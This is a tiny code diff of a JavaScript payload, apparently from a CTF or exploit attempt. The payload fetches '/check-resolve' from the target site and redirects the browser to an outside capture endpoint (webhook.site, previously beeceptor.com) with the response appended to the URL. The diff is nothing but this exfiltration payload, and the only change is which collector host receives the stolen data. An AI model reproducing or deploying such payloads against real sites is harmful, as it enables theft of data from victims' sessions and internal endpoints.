@@ -16,5 +16,5 @@ fetch('/check-resolve', {
 })
 .then(response => response.text())
 .then(data => {
-    window.location = 'https://khanh.free.beeceptor.com/?result=' + encodeURIComponent(data);
+    window.location = 'https://webhook.site/2fc3e3e9-24dd-4048-91c9-b5cc45619d1d/?result=' + encodeURIComponent(data);
 });
